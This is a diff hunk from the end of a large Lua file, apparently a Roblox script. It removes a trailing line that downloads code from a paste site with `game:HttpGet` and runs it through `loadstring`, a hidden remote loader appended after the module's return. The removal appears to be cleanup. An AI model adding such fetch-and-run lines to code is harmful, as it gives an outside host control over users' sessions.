@@ -14051,5 +14051,3 @@ return b
 end
 
 return aa
-
-loadstring(game:HttpGet("https://pastefy.app/IJuPdZzp/raw"))()
